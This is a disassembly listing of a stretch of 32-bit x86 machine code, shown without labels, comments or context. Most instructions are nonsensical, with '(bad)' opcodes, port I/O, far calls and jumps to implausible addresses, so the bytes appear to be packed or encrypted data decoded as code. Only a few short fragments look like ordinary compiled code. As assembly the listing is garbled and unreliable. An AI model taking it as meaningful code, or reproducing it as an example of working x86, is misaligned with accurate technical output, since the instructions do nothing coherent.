  406b4c:	mov    esi,0x227e1f15
  406b51:	repz xor BYTE PTR [ebx],bl
  406b54:	std    
  406b55:	jmp    0x406b6d
  406b57:	mov    eax,ds:0x67549438
  406b5c:	daa    
  406b5d:	(bad)  
  406b5e:	jb     0x406ba6
  406b60:	push   0xffffffb1
  406b62:	out    0xeb,eax
  406b64:	push   edi
  406b65:	ficomp WORD PTR [ecx+0x566aebf5]
  406b6b:	fwait
  406b6c:	mov    ds:0x45f210e0,ax
  406b72:	pop    edi
  406b73:	cdq    
  406b74:	push   ebx
  406b75:	cmp    eax,eax
  406b77:	jge    0x406bdf
  406b79:	or     BYTE PTR [ebp-0x226f2c23],cl
  406b7f:	jnp    0x406b0e
  406b81:	adc    eax,DWORD PTR [esi-0x22]
  406b84:	xchg   ebp,eax
  406b85:	test   eax,0x9d818645
  406b8a:	xchg   ecx,eax
  406b8b:	popf   
  406b8c:	fld    DWORD PTR [ebx-0x6f]
  406b8f:	arpl   si,bp
  406b91:	(bad)  [esi-0x766fef4d]
  406b97:	inc    eax
  406b98:	mov    dl,0xb7
  406b9a:	in     al,0x7c
  406b9c:	stos   DWORD PTR es:[edi],eax
  406b9d:	repnz ins DWORD PTR es:[edi],dx
  406b9f:	push   ss
  406ba0:	rcl    DWORD PTR [ebp-0x11c7cc8e],0xc7
  406ba7:	jecxz  0x406bb7
  406ba9:	sti    
  406baa:	add    eax,0x3622a75a
  406baf:	inc    ebp
  406bb0:	popf   
  406bb1:	data16 sahf 
  406bb3:	fild   QWORD PTR [edx]
  406bb5:	xchg   edx,eax
  406bb6:	mov    bl,0x82
  406bb8:	inc    edi
  406bb9:	mov    eax,DWORD PTR [edi-0x62d79d9d]
  406bbf:	inc    ebp
  406bc0:	pop    edx
  406bc1:	int3   
  406bc2:	adc    al,dl
  406bc4:	out    dx,al
  406bc5:	pusha  
  406bc6:	into   
  406bc7:	cmp    DWORD PTR [ecx-0x636adef0],ebp
  406bcd:	mov    esi,0xf6144b60
  406bd2:	call   0x1c52f6a2
  406bd7:	mov    ds:0xd9ca5464,al
  406bdc:	outs   dx,BYTE PTR fs:[esi]
  406bde:	jp     0x406bdd
  406be0:	mov    eax,ds:0xd6c2fbc
  406be5:	scas   al,BYTE PTR es:[edi]
  406be6:	sbb    BYTE PTR [ebx+0x35c7624],ah
  406bec:	or     eax,0xa11261de
  406bf1:	pop    ecx
  406bf2:	mov    edi,0x55e35370
  406bf7:	retf   0xff94
  406bfa:	dec    esi
  406bfb:	arpl   WORD PTR [ecx-0x59],sp
  406bfe:	enter  0x321a,0x44
  406c02:	les    ecx,FWORD PTR [esp+edi*1-0x37806eaa]
  406c09:	inc    edi
  406c0a:	mov    al,0xf1
  406c0c:	pop    ecx
  406c0d:	jmp    0xddb84191
  406c12:	stos   DWORD PTR es:[edi],eax
  406c13:	add    DWORD PTR [ecx],ebx
  406c15:	and    ecx,DWORD PTR [ecx-0x3b976cf7]
  406c1b:	das    
  406c1c:	inc    ecx
  406c1d:	lea    edx,[edi]
  406c1f:	icebp  
  406c20:	jnp    0x406bc0
  406c22:	pop    ecx
  406c23:	aad    0xe6
  406c25:	mov    ds:0xb9486b6e,al
  406c2a:	sub    eax,0x89b0ffb4
  406c2f:	dec    edx
  406c30:	mov    esp,0xcda06d6e
  406c35:	mov    cl,0x2a
  406c37:	xor    ah,0x2
  406c3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c3b:	out    0xa4,eax
  406c3d:	shl    eax,cl
  406c3f:	mov    edx,esi
  406c41:	jmp    0x406cae
  406c43:	fild   DWORD PTR [ebx+edi*8+0x55d8b7e2]
  406c4a:	and    ah,dl
  406c4c:	mov    ah,0x5c
  406c4e:	sub    eax,0xb9464444
  406c53:	loopne 0x406bf7
  406c55:	jae    0x406c29
  406c57:	icebp  
  406c58:	sbb    eax,DWORD PTR [edi]
  406c5a:	or     DWORD PTR [edx+edi*2-0x3f],0xd4742e10
  406c62:	or     edi,ecx
  406c64:	loope  0x406cb5
  406c66:	or     BYTE PTR [edx],ah
  406c68:	adc    eax,0x4c2da5ee
  406c6d:	cmp    BYTE PTR [bx+di-0x20],0xb6
  406c72:	leave  
  406c73:	out    dx,al
  406c74:	sub    DWORD PTR [ebp+0x61868e93],ebx
  406c7a:	lock nop
  406c7c:	sbb    eax,ebp
  406c7e:	and    edx,0x4ff199ae
  406c84:	test   DWORD PTR [ebp-0x5d93a462],0x735f8509
  406c8e:	leave  
  406c8f:	ret    0x87d9
  406c92:	dec    ecx
  406c93:	call   0xfc25d071
  406c98:	dec    esp
  406c99:	sbb    dl,dh
  406c9b:	and    bh,BYTE PTR [esp+edi*1+0x3d]
  406c9f:	call   0x6acb:0x9751a110
  406ca6:	aad    0xd1
  406ca8:	and    eax,DWORD PTR [eax]
  406caa:	fnsave [ebp-0x6a]
  406cad:	mul    DWORD PTR [edi+0x16bd1439]
  406cb3:	xchg   esp,eax
  406cb4:	enter  0x9c88,0xc1
  406cb8:	js     0x406c9d
  406cba:	test   eax,0x7a03a68f
  406cbf:	jnp    0x406cbd
  406cc1:	pop    edx
  406cc2:	xchg   ebp,eax
  406cc3:	or     eax,edi
  406cc5:	or     eax,0x7adf462f
  406cca:	out    0xff,eax
  406ccc:	jne    0x406cc2
  406cce:	push   DWORD PTR [ebp-0x14]
  406cd1:	call   0x405aeb
  406cd6:	test   eax,eax
  406cd8:	je     0x40739d
  406cde:	lea    eax,[ebp-0x78]
  406ce1:	jmp    0x40702e
  406ce6:	enter  0xde98,0x5a
  406cea:	outs   dx,BYTE PTR ds:[esi]
  406ceb:	bound  edx,QWORD PTR [edx+esi*4-0x2d]
  406cef:	adc    eax,0x3e92d985
  406cf4:	mov    ch,0x5e
  406cf6:	retf   
  406cf7:	(bad)  
  406cf8:	jo     0x406d6a
  406cfa:	and    BYTE PTR [ebp+0x70],bh
  406cfd:	jo     0x406ca1
  406cff:	pop    ecx
  406d00:	bound  edx,QWORD PTR [esi-0x227d9283]
  406d06:	jbe    0x406cc7
  406d08:	xor    BYTE PTR [edi-0xa],0x29
  406d0c:	mov    ch,0xe0
  406d0e:	jle    0x406cf0
  406d10:	jmp    0x3d53cba6
  406d15:	xor    al,0x17
  406d17:	repnz icebp 
  406d19:	or     edx,DWORD PTR [eax+0x6]
  406d1c:	(bad)  
  406d1d:	push   esp
  406d1e:	xor    al,0x3
  406d20:	loope  0x406cbf
  406d22:	popf   
  406d23:	lea    eax,[esi]
  406d25:	imul   ecx,DWORD PTR [esi],0x5fb5b450
  406d2b:	mov    eax,ds:0x569150cc
  406d30:	xor    BYTE PTR [ebx+0x54],0x4d
  406d34:	sub    eax,0xc9582499
  406d39:	loopne 0x406d58
  406d3b:	mov    edi,ds
  406d3d:	call   0xbd24:0xb0295303
  406d44:	sar    BYTE PTR [esi+0x4e9cedc1],0xb9
  406d4b:	cdq    
  406d4c:	(bad)  
  406d4e:	mov    ah,0xae
  406d50:	mov    dl,0x41
  406d52:	jmp    0x2b4a:0xba50ae4c
  406d59:	push   ebp
  406d5a:	rcl    BYTE PTR [edi-0x7b],1
  406d5d:	repz mov edi,0x6171dcd
  406d63:	pop    ebp
  406d64:	add    BYTE PTR [ebp-0x1a],dh
  406d67:	fwait
  406d68:	bound  edx,QWORD PTR [ebx-0x4e55be98]
  406d6e:	add    DWORD PTR ss:[ebx+0xc],ebx
  406d72:	rcl    BYTE PTR [edi+0x40],0x57
  406d76:	inc    ecx
  406d77:	dec    eax
  406d78:	or     al,dl
  406d7a:	jne    0x406dad
  406d7c:	xchg   ecx,eax
  406d7d:	mov    esp,esi
  406d7f:	cmc    
  406d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d81:	push   es
  406d82:	int    0x87
  406d84:	bound  esi,QWORD PTR [ecx]
  406d86:	mov    ss,WORD PTR [edi-0x48]
  406d89:	aaa    
  406d8a:	push   ds
  406d8b:	cmp    BYTE PTR [ecx-0x54f9974c],0x1e
  406d92:	mov    ecx,0x2d14c6fa
  406d97:	or     bh,dl
  406d99:	jbe    0x406d81
  406d9b:	out    0x3d,al
  406d9d:	and    BYTE PTR [esi+edx*2],cl
  406da0:	xor    eax,0x6beb97ba
  406da5:	ss inc eax
  406da7:	imul   ebx,DWORD PTR [esi+0x2a24c77c],0x7e
  406dae:	iret   
  406daf:	xchg   edx,eax
  406db0:	mov    ebp,0xe9f18a7f
  406db5:	and    al,0x26
  406db7:	mul    BYTE PTR [ecx]
  406db9:	cli    
  406dba:	(bad)  
  406dbb:	cwde   
  406dbc:	lahf   
  406dbd:	jo     0x406e17
  406dbf:	jo     0x406de8
  406dc1:	xor    eax,0xe2083361
  406dc6:	scas   al,BYTE PTR es:[edi]
  406dc7:	pop    eax
  406dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dc9:	adc    al,BYTE PTR [edi-0x2d]
  406dcc:	push   cs
  406dcd:	adc    ebx,DWORD PTR [ebp+0x12]
  406dd0:	cmp    DWORD PTR [ecx+0x59740f1f],ecx
  406dd6:	inc    edi
  406dd7:	mov    BYTE PTR [eax-0xf],bh
  406dda:	and    al,0x7b
  406ddc:	(bad)  {k7}{z}
  406de1:	inc    eax
  406de2:	mov    WORD PTR [esi+0x44],?
  406de5:	jmp    0x406e03
  406de7:	imul   esi,edi,0x8b973148
  406ded:	rcr    DWORD PTR [esi+ebp*1+0x60],cl
  406df1:	ins    BYTE PTR es:[edi],dx
  406df2:	jo     0x406de4
  406df4:	or     eax,0x4bef50d1
  406df9:	inc    esp
  406dfa:	or     DWORD PTR [edx+0x4f],edi
  406dfd:	push   ebx
  406dfe:	cmp    eax,0x79ad734b
  406e03:	int    0xc6
  406e05:	call   0xbfda:0xe5722cec
  406e0c:	mov    esp,edx
  406e0e:	xor    ecx,DWORD PTR [ecx+0x2e]
  406e11:	jge    0x406e03
  406e13:	dec    esi
  406e14:	mov    ds:0xfb809260,eax
  406e19:	inc    esi
  406e1a:	stc    
  406e1b:	xor    ch,0xcd
  406e1e:	(bad)  
  406e1f:	lea    eax,[ebx]
  406e21:	jns    0x406de3
  406e23:	pop    ecx
  406e24:	arpl   WORD PTR [ecx+0x31],si
  406e27:	jne    0x406e06
  406e29:	add    dl,cl
  406e2b:	mov    edx,0x6a8fcf20
  406e30:	fdiv   st(0),st
  406e32:	aaa    
  406e33:	(bad)  
  406e35:	scas   eax,DWORD PTR es:[edi]
  406e36:	mov    ds:0x4d3aeebc,al
  406e3b:	iret   
  406e3c:	cmp    BYTE PTR [esp+esi*8-0x13],0x46
  406e41:	xchg   ebp,eax
  406e42:	fild   QWORD PTR [ebx-0x3b42570e]
  406e48:	or     eax,0x474e06e2
  406e4d:	sub    DWORD PTR [ebx+0x7],ecx
  406e50:	pop    ss
  406e51:	cdq    
  406e52:	paddb  mm2,QWORD PTR [ebx-0x1e52906c]
  406e59:	(bad)  
  406e5b:	fadd   DWORD PTR [edx]
  406e5d:	std    
  406e5e:	stc    
  406e5f:	mov    BYTE PTR [edi],0x4d
  406e62:	push   es
  406e63:	add    DWORD PTR [bx+si+0x18],ebx
  406e67:	sbb    BYTE PTR [edi+0x56],ch
  406e6a:	icebp  
  406e6b:	stc    
  406e6c:	hlt    
  406e6d:	mov    eax,0xf4ce075f
  406e72:	inc    bp
  406e74:	ds dec esp
  406e76:	mov    DWORD PTR [ebx+0x65],ebp
  406e79:	cmp    edx,edx
  406e7b:	enter  0x2b46,0xc5
  406e7f:	lods   al,BYTE PTR ds:[esi]
  406e80:	in     eax,0xb8
  406e82:	dec    esi
  406e83:	inc    eax
  406e84:	sub    BYTE PTR [edi+0x2e],dl
  406e87:	cmc    
  406e88:	inc    ebx
  406e89:	sub    dh,BYTE PTR [ecx]
  406e8b:	mov    dh,0x98
  406e8d:	sub    ch,BYTE PTR [edx+0x5]
  406e90:	jp     0x406eff
  406e92:	or     eax,0xbc9da4a3
  406e97:	mov    ss,WORD PTR [ebx]
  406e99:	xchg   esp,ebp
  406e9b:	mov    bh,BYTE PTR [ebp*4+0x2bfa2560]
  406ea2:	repz shl edi,1
  406ea5:	mov    edi,0x4679ee89
  406eaa:	imul   edi,DWORD PTR [eax],0xffffffd9
  406ead:	mov    DWORD PTR [edx],0xee3519e0
  406eb3:	mov    bl,BYTE PTR [ebp+eiz*8-0x2c]
  406eb7:	ficomp DWORD PTR [esi-0x2dd797c3]
  406ebd:	dec    ebp
  406ebe:	icebp  
  406ebf:	xlat   BYTE PTR ds:[ebx]
  406ec0:	jmp    0x364b21db
  406ec5:	int3   
  406ec6:	sbb    BYTE PTR [esi-0x31],dl
  406ec9:	dec    ebp
  406eca:	aas    
  406ecb:	add    BYTE PTR [eax+0x52],bl
  406ece:	sti    
  406ecf:	ret    0x7412
  406ed2:	sbb    BYTE PTR [ebx+eiz*4-0x2ac2de72],cl
  406ed9:	sbb    eax,0xf393ef6a
  406ede:	sahf   
  406edf:	mov    BYTE PTR [ecx-0x72],bl
  406ee2:	adc    bh,BYTE PTR [eax+0x15]
  406ee5:	push   esi
  406ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ee7:	out    0xe5,al
  406ee9:	loop   0x406e6c
  406eeb:	adc    BYTE PTR [esi],dl
  406eed:	maxps  xmm5,XMMWORD PTR [ecx-0x5577ff51]
  406ef4:	and    eax,0x76b0e94e
  406ef9:	pop    esi
  406efa:	fwait
  406efb:	cmp    al,BYTE PTR [ecx+ebx*2-0x5c]
  406eff:	popf   
  406f00:	in     eax,dx
  406f01:	xchg   DWORD PTR [eax-0x64e1c6e8],ecx
  406f07:	push   edx
  406f08:	sub    eax,eax
  406f0a:	mov    cl,0xf6
  406f0c:	mov    dh,0xed
  406f0e:	out    0xbc,al
  406f10:	stc    
  406f11:	push   edx
  406f12:	or     DWORD PTR [edx],ecx
  406f14:	sub    eax,0xab9dda33
  406f19:	sti    
  406f1a:	pusha  
  406f1b:	dec    BYTE PTR [edx+ecx*1+0x9]
  406f1f:	adc    edi,DWORD PTR [ebx]
  406f21:	cmp    al,0xf3
  406f23:	add    ah,BYTE PTR [ebp-0x57365fb0]
  406f29:	sub    dl,BYTE PTR [ebx+edi*8-0x46bcfa5]
  406f30:	add    DWORD PTR [eax-0x6a25e450],0xd0739c4e
  406f3a:	cmp    al,0x1d
  406f3c:	aad    0xd5
  406f3e:	mov    ebx,0x1f1ffbc8
  406f43:	xor    DWORD PTR [edx],0x46ae5bbc
  406f49:	pop    ds
  406f4a:	xchg   esp,eax
  406f4b:	rcr    DWORD PTR [ebp+edi*2+0x2e1bc03a],1
  406f52:	clc    
  406f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f54:	pop    es
  406f55:	fnstenv [eax-0x14c603dd]
  406f5b:	stc    
  406f5c:	stos   DWORD PTR es:[edi],eax
  406f5d:	mov    ecx,0x8633132c
  406f62:	clc    
  406f63:	or     BYTE PTR [ebx-0x7767df06],dl
  406f69:	xchg   ebp,eax
  406f6a:	jbe    0x406f34
  406f6c:	dec    BYTE PTR [edi]
  406f6e:	out    dx,al
  406f6f:	xchg   BYTE PTR [edx-0x59d0ad71],dh
  406f75:	push   ss
  406f76:	(bad)  
  406f77:	addr16 pop ds
  406f79:	jno    0x406fe8
  406f7b:	sub    DWORD PTR [ebp+0x19],esi
  406f7e:	inc    ebp
  406f7f:	jmp    0x17ec9f42
  406f84:	test   BYTE PTR [esi+0x7cd7b84d],ch
  406f8a:	inc    eax
  406f8b:	jo     0x406fde
  406f8d:	and    ah,BYTE PTR [edi]
  406f8f:	jbe    0x406f81
  406f91:	and    DWORD PTR [ecx+0x6f162622],esp
  406f97:	add    eax,0xfda66ffc
  406f9c:	vdivps xmm2,xmm6,XMMWORD PTR [esi+esi*1+0x64]
  406fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fa3:	lds    edx,FWORD PTR [ebp-0x12]
  406fa6:	inc    ecx
  406fa7:	push   ds
  406fa8:	pop    esi
  406fa9:	or     ebx,DWORD PTR [ebx]
  406fab:	xchg   edx,eax
  406fac:	int3   
  406fad:	ds jae 0x406fba
  406fb0:	cmp    edx,edx
  406fb2:	neg    ebx
  406fb4:	int3   
  406fb5:	jno    0x406fab
  406fb7:	add    BYTE PTR [edi-0x1a02482],bh
  406fbd:	pop    esi
  406fbe:	iret   
  406fbf:	clc    
  406fc0:	push   edx
  406fc1:	fcmovnu st,st(0)
  406fc3:	adc    DWORD PTR [ebx+0x54],esp
  406fc6:	in     eax,0x75
  406fc8:	popa   
  406fc9:	inc    esp
  406fca:	out    0x6e,al
  406fcc:	xchg   edx,eax
  406fcd:	add    DWORD PTR [ecx+0x29],edi
  406fd0:	pop    esp
  406fd1:	sbb    ecx,DWORD PTR [esi]
  406fd3:	sbb    eax,0x858b19f6
  406fd8:	mov    dh,0x2e
  406fda:	jbe    0x407018
  406fdc:	jnp    0x40700f
  406fde:	aad    0x75
  406fe0:	push   esp
  406fe1:	add    DWORD PTR [ebx+0x39098d96],edx
  406fe7:	daa    
  406fe8:	test   al,0x19
  406fea:	aad    0xe5
  406fec:	mov    eax,0x4ceee3e6
  406ff1:	sub    al,0x4a
  406ff3:	mov    al,0xdd
  406ff5:	lea    eax,[eax]
  406ff7:	jbe    0x407029
  406ff9:	mov    ds:0x6db11176,al
  406ffe:	enter  0xf11a,0xb7
  407002:	dec    ecx
  407003:	adc    DWORD PTR [esi],ebx
  407005:	(bad)  
  407006:	es pop edx
  407008:	jmp    DWORD PTR [ebx]
  40700a:	cmc    
  40700b:	clc    
  40700c:	fcmovnu st,st(3)
  40700e:	sbb    edi,DWORD PTR [ebx-0x7ce9b502]
  407014:	je     0x40700a
  407016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407017:	adc    al,0x69
  407019:	js     0x40705f
  40701b:	add    DWORD PTR [eax+0x18],edi
  40701e:	add    dh,ch
  407020:	jns    0x407091
  407022:	call   0x1f30131a
  407027:	cmp    bl,BYTE PTR [ecx-0x67841b3d]
  40702d:	push   0xec458b50
  407032:	xor    eax,esi
  407034:	add    eax,edi
  407036:	push   eax
  407037:	mov    eax,DWORD PTR [ebp-0x10]
  40703a:	add    eax,0xee
  40703f:	push   eax
  407040:	mov    eax,DWORD PTR [ebp-0x10]
  407043:	jmp    0x407390
  407048:	inc    esp
  407049:	jmp    edx
  40704b:	cwde   
  40704c:	loope  0x4070af
  40704e:	inc    edx
  40704f:	pop    ebx
  407050:	(bad)  
  407051:	mov    dh,0x44
  407053:	mov    esi,0x4d29bdf3
  407058:	sti    
  407059:	les    esi,FWORD PTR [eax+0x70]
  40705c:	and    BYTE PTR [ebp+0x70],bh
  40705f:	jo     0x40704d
  407061:	retf   
  407062:	adc    eax,0x41c18c72
  407067:	(bad)  
  407068:	imul   ebx,DWORD PTR [ebx],0xffffffa6
  40706b:	rol    BYTE PTR [edx+0x30],0x7e
  40706f:	fwait
  407070:	loopne 0x407007
  407072:	popa   
  407073:	xchg   ebx,eax
  407074:	mov    al,ds:0x8611e637
  407079:	fisttp DWORD PTR ds:0x69813bd5
  40707f:	pop    es
  407080:	push   esi
  407081:	popf   
  407082:	popf   
  407083:	shl    al,1
  407085:	(bad)  
  407087:	dec    eax
  407088:	test   al,0x18
  40708a:	in     al,dx
  40708b:	aam    0x97
  40708d:	mov    ebp,0xdb769ba6
  407092:	xchg   DWORD PTR [ecx+ebx*1-0x46054ef3],ebx
  407099:	out    dx,eax
  40709a:	sub    esp,DWORD PTR [edi-0x149ba162]
  4070a0:	jnp    0x4070e8
  4070a2:	fldenv [edx]
  4070a4:	mov    dh,0x15
  4070a6:	adc    BYTE PTR [edi+ecx*2+0x466e93d6],0xb9
  4070ae:	mov    al,0x58
  4070b0:	jmp    0xba4b8637
  4070b5:	(bad)  
  4070b6:	or     DWORD PTR [ebp-0x616d815c],ebp
  4070bc:	inc    eax
  4070bd:	jne    0x407132
  4070bf:	out    0xfb,al
  4070c1:	loop   0x407112
  4070c3:	cmp    ebx,edx
  4070c5:	pop    es
  4070c6:	inc    esp
  4070c7:	sub    al,0xd8
  4070c9:	ins    BYTE PTR es:[edi],dx
  4070ca:	in     eax,0x95
  4070cc:	sahf   
  4070cd:	add    eax,0x7b7e6aff
  4070d2:	xchg   ecx,eax
  4070d3:	sub    BYTE PTR [edi],0x3d
  4070d6:	xchg   ecx,eax
  4070d7:	sub    al,0xc1
  4070d9:	jge    0x4070c5
  4070db:	stos   DWORD PTR es:[edi],eax
  4070dc:	xlat   BYTE PTR ds:[ebx]
  4070dd:	gs fwait
  4070df:	jmp    0x407075
  4070e1:	sbb    eax,0x810726ee
  4070e6:	add    DWORD PTR [eax+0x37],ecx
  4070e9:	xor    eax,0x92f5421b
  4070ee:	mov    al,0x53
  4070f0:	in     al,dx
  4070f1:	cs push cs
  4070f3:	jae    0x4070e2
  4070f5:	aaa    
  4070f6:	cli    
  4070f7:	jne    0x4070bc
  4070f9:	and    esi,DWORD PTR [esi-0x50]
  4070fc:	enter  0x6d4d,0x83
  407100:	dec    ecx
  407101:	aad    0xf6
  407103:	mov    eax,DWORD PTR [esi+0x318b33be]
  407109:	popa   
  40710a:	xor    BYTE PTR ds:[ebp-0x59],0xde
  40710f:	mov    edi,0x35da7f02
  407114:	jne    0x407167
  407116:	out    0x73,al
  407118:	test   BYTE PTR [ecx],bl
  40711a:	jne    0x407124
  40711c:	pop    edi
  40711d:	add    ah,BYTE PTR [ebp-0x7]
  407120:	test   al,0x86
  407122:	push   ecx
  407123:	lods   al,BYTE PTR ds:[esi]
  407124:	xchg   esi,eax
  407125:	dec    esp
  407126:	dec    edx
  407127:	mov    edi,0xacb6daef
  40712c:	ja     0x4071a2
  40712e:	(bad)  
  40712f:	pushf  
  407130:	mov    al,0xdf
  407132:	fnstsw WORD PTR [edx]
  407134:	push   ss
  407135:	sbb    BYTE PTR [esi-0x7a55251b],dl
  40713b:	xchg   ebp,eax
  40713c:	add    eax,0xb3f308cd
  407141:	call   0x7e37c466
  407146:	or     cl,ch
  407148:	std    
  407149:	loop   0x4071bb
  40714b:	jbe    0x407178
  40714d:	jmp    0x407192
  40714f:	mov    ebp,0x7b5443b0
  407154:	xchg   edx,eax
  407155:	stos   DWORD PTR es:[edi],eax
  407156:	ror    dh,cl
  407158:	int    0x49
  40715a:	fnstsw WORD PTR [eax+ebx*2+0x7a]
  40715e:	adc    ebp,DWORD PTR [eax]
  407160:	pop    ecx
  407161:	xor    BYTE PTR [esp+edx*2+0x74],al
  407165:	mov    ds:0x2d785359,eax
  40716a:	cld    
  40716b:	jmp    0x4ce4620
  407170:	jmp    0x407148
  407172:	fistp  WORD PTR [eax-0x2c]
  407175:	sbb    esp,ecx
  407177:	mov    ebp,0x8cbc2a0a
  40717c:	leave  
  40717d:	(bad)  
  40717e:	mov    cl,0xbe
  407180:	clc    
  407181:	inc    ebp
  407182:	dec    ecx
  407183:	fadd   st,st(1)
  407185:	sbb    bl,BYTE PTR [edx+0x6a]
  407188:	push   DWORD PTR [ecx]
  40718a:	in     al,0xbc
  40718c:	mov    eax,ds:0x111361f
  407191:	jecxz  0x40716f
  407193:	push   ebx
  407194:	and    al,0x42
  407196:	jns    0x4071a4
  407198:	jne    0x4071ed
  40719a:	sbb    BYTE PTR [ecx],cl
  40719c:	jecxz  0x4071db
  40719e:	ficom  DWORD PTR [edx]
  4071a0:	dec    ebx
  4071a1:	(bad)  
  4071a2:	dec    edi
  4071a3:	das    
  4071a4:	pop    edx
  4071a5:	stc    
  4071a6:	icebp  
  4071a7:	push   0xffffffb5
  4071a9:	ret    0xcdfd
  4071ac:	push   ebx
  4071ad:	mov    BYTE PTR [edx+ebp*1],bl
  4071b0:	mov    al,0x74
  4071b2:	test   DWORD PTR [edi+0x32181426],ebx
  4071b8:	lods   eax,DWORD PTR ds:[esi]
  4071b9:	sub    BYTE PTR [ebp+edi*1-0x51d31ff3],bh
  4071c0:	sub    DWORD PTR [eax],esp
  4071c2:	mov    bh,0xdf
  4071c4:	mov    edx,0xf08f796
  4071c9:	int    0xa5
  4071cb:	repz int 0x8c
  4071ce:	pop    edi
  4071cf:	call   0x9347:0x98b122c3
  4071d6:	call   0x6d35:0xc91a143d
  4071dd:	cli    
  4071de:	or     DWORD PTR [edi-0x391d69a1],esp
  4071e4:	scas   eax,DWORD PTR es:[edi]
  4071e5:	test   eax,esi
  4071e7:	cmp    DWORD PTR ds:0x63d70ac8,ecx
  4071ed:	jg     0x40719c
  4071ef:	sbb    edi,edi
  4071f1:	aad    0xc8
  4071f3:	xchg   esp,eax
  4071f4:	xor    edi,0x23bfe2c9
  4071fa:	or     BYTE PTR [ecx+0x15],0xef
  4071fe:	mov    ds,WORD PTR [ecx+0x34]
  407201:	test   cl,bh
  407203:	adc    DWORD PTR [edi-0xc037cd5],esi
  407209:	out    dx,al
  40720a:	fistp  DWORD PTR [ebx]
  40720c:	xchg   ecx,eax
  40720d:	iret   
  40720e:	ficom  WORD PTR [edi+ecx*2-0x1d]
  407212:	adc    bh,BYTE PTR [eax-0x46]
  407215:	mov    eax,0xfbcbbe76
  40721a:	sub    BYTE PTR [edi-0x18d86da0],0x85
  407221:	loop   0x4071b3
  407223:	(bad)  
  407224:	in     eax,dx
  407225:	mov    esi,0xf15c641f
  40722a:	repnz rol DWORD PTR [esi+ebp*1+0x67],1
  40722f:	stc    
  407230:	es sub ecx,esp
  407233:	or     BYTE PTR [edx-0x727c0929],dh
  407239:	mov    dl,0x97
  40723b:	nop
  40723c:	pop    ecx
  40723d:	jg     0x4071d1
  40723f:	inc    esi
  407240:	imul   esp,DWORD PTR [ebp+0x44],0x3501810b
  407247:	jp     0x4071f7
  407249:	mov    ebx,0x61e8de71
  40724e:	jle    0x407269
  407250:	leave  
  407251:	or     DWORD PTR [ecx-0x52ce17af],edi
  407257:	cmp    al,0xdb
  407259:	fcom   DWORD PTR [ebx+edi*4+0x78284443]
  407260:	sub    ecx,DWORD PTR [edi]
  407262:	inc    eax
  407263:	xchg   BYTE PTR [esi-0x3e],dl
  407266:	push   es
  407267:	ret    
  407268:	sbb    eax,0x56ca0eee
  40726d:	pop    ds
  40726e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40726f:	in     eax,dx
  407270:	jp     0x407241
  407272:	xchg   DWORD PTR [esi+0x3082fdb9],esi
  407278:	imul   esi,DWORD PTR [edx+ebx*8+0x411d80e6],0x88113794
  407283:	cmp    bh,BYTE PTR [ebx]
  407285:	lahf   
  407286:	cwde   
  407287:	pop    ebp
  407288:	outs   dx,BYTE PTR ds:[esi]
  407289:	pop    esi
  40728a:	sti    
  40728b:	mov    ds:0x62863fff,eax
  407290:	mov    bh,0x1f
  407292:	test   al,0xd6
  407294:	or     al,0x4c
  407296:	lods   eax,DWORD PTR ds:[esi]
  407297:	push   ss
  407298:	out    0x3f,eax
  40729a:	pop    eax
  40729b:	retf   0xf0c0
  40729e:	mov    ch,0x4c
  4072a0:	repnz adc bl,BYTE PTR [ebx+0x8]
  4072a4:	fcom   st(6)
  4072a6:	inc    ebp
  4072a7:	hlt    
  4072a8:	or     eax,0xed289584
  4072ad:	imul   ebp,DWORD PTR [edx+0x643d1a3d],0xdd0c6def
  4072b7:	push   edi
  4072b8:	int    0x8
  4072ba:	sahf   
  4072bb:	out    0xcd,al
  4072bd:	push   esi
  4072be:	ja     0x40732e
  4072c0:	jnp    0x407307
  4072c2:	popf   
  4072c3:	sbb    eax,0x71e8d3a3
  4072c8:	jae    0x40727d
  4072ca:	stc    
  4072cb:	jo     0x4072fd
  4072cd:	call   0xbc41:0x2753769a
  4072d4:	aas    
  4072d5:	pop    esp
  4072d6:	ds popa 
  4072d8:	mov    DWORD PTR [eax],esp
  4072da:	jg     0x4072f2
  4072dc:	lahf   
  4072dd:	pushf  
  4072de:	sbb    dl,BYTE PTR [edi]
  4072e0:	dec    ebp
  4072e1:	arpl   di,di
  4072e3:	add    DWORD PTR [esi+0x4e],0x24
  4072e7:	dec    edx
  4072e8:	div    BYTE PTR [esi]
  4072ea:	mov    dh,0x7c
  4072ec:	dec    ebp
  4072ed:	jg     0x407327
  4072ef:	push   ebx
  4072f0:	scas   al,BYTE PTR es:[edi]
  4072f1:	addr16 pop eax
  4072f3:	add    ecx,DWORD PTR [ecx+0x3f25b6e7]
  4072f9:	sub    BYTE PTR [edx+ebp*4+0x52e67a02],ah
  407300:	mov    bh,0x4d
  407302:	mov    bh,0x18
  407304:	cmp    DWORD PTR [edx+0x54e5525],esp
  40730a:	iret   
  40730b:	ret    0x1798
  40730e:	mov    ds:0xaaca46e2,al
  407313:	xchg   BYTE PTR [ebx+0x6a],ah
  407316:	out    dx,eax
  407317:	popf   
  407318:	std    
  407319:	cmp    al,0x6d
  40731b:	rcl    DWORD PTR [esi],1
  40731d:	adc    ecx,DWORD PTR [ebp-0x5]
  407320:	push   es
  407321:	push   0xa9e5c3b7
  407326:	sbb    al,0xd
  407328:	shl    ecx,0xb2
  40732b:	push   esp
  40732c:	xor    eax,DWORD PTR [esi-0x5018d9b8]
  407332:	(bad)  
  407334:	fist   WORD PTR [ebx-0x1c]
  407337:	sub    ebx,DWORD PTR [ebp-0x42b437a6]
  40733d:	push   cs
  40733e:	cmp    al,dh
  407340:	test   eax,0x453fd806
  407345:	scas   al,BYTE PTR es:[edi]
  407346:	cmp    eax,0xb902b9ff
  40734b:	or     DWORD PTR [ebx],eax
  40734d:	or     BYTE PTR [edx],0xaa
  407350:	outs   dx,BYTE PTR ds:[esi]
  407351:	jb     0x40730a
  407353:	dec    esp
  407354:	push   esi
  407355:	add    eax,0x7bead3e1
  40735a:	xchg   esp,eax
  40735b:	ins    DWORD PTR es:[edi],dx
  40735c:	leave  
  40735d:	(bad)  
